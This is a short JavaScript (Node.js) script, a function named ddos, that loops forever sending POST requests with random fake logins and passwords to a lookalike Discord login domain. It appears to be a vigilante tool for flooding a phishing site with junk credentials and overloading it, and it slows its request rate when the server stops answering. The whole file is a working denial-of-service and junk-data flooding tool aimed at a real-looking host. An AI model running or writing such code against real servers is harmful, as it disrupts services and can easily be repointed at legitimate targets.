const axios = require('axios');
const url = 'https://dliscord.com/discord/login';
let timeout = 50;

async function ddos() {
    while (true) {
        const nonce1 = Math.random().toString(36).substring(2, 15);
        const nonce2 = Math.random().toString(36).substring(2, 15);
        const nonce3 = Math.random().toString(36).substring(2, 15);
        const data = {
            login: `${nonce3}sik${nonce1}e@gmail.com${nonce2}`,
            password: `${nonce2}lolge${nonce3}tscammed${nonce2}`
        };
        axios.post(url, data)
        .then(resp =>{
            console.log(resp);
        })
        .catch(err =>{
            timeout = err.response ? 50 : 2000;
            console.log('Sent Request!', err.response ? err.response.status : "Server Appears to be dead, request speed slowed down");
        });
        await new Promise(resolve => setTimeout(resolve, timeout));
    }
}
ddos();